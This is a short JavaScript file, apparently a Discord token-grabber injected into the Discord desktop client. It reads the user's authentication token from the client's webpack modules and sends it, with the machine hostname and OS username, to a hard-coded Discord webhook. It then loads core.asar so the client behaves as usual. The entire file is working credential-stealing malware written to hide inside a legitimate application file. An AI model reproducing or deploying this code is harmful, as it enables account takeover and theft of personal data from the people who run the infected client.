const fs = require('fs');
const os = require('os');
const https = require('https');

const WEBHOOK = "%WEBHOOK%";

function sendWebhook(data) {
    const postData = JSON.stringify(data);
    const options = {
        hostname: 'discord.com',
        path: '/api/webhooks/1501483874222608507/FDcwuZLFcZn57oopdAPCS3l7qooDz6rtPqMvU4fYgJvRmN7VOgbAg_sgQCiVTPisp-1X',
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }
    };
    const req = https.request(options);
    req.on('error', () => {});
    req.write(postData);
    req.end();
}

function getToken() {
    try {
        const webpack = webpackChunkdiscord_app.push([[], {}, (e) => { m = []; for (let c in e.c) m.push(e.c[c]) }]);
        const module = m.find(m => m?.exports?.default?.getToken !== undefined);
        return module?.exports?.default?.getToken();
    } catch (e) { return null; }
}

setTimeout(() => {
    const token = getToken();
    if (token) {
        sendWebhook({
            content: `Token: ${token}\nHost: ${os.hostname()}\nUser: ${os.userInfo().username}`,
            username: "Grabber"
        });
        console.log('[+] Token sent.');
    }
}, 5000);

console.log('[+] Injection loaded.');
module.exports = require('./core.asar');
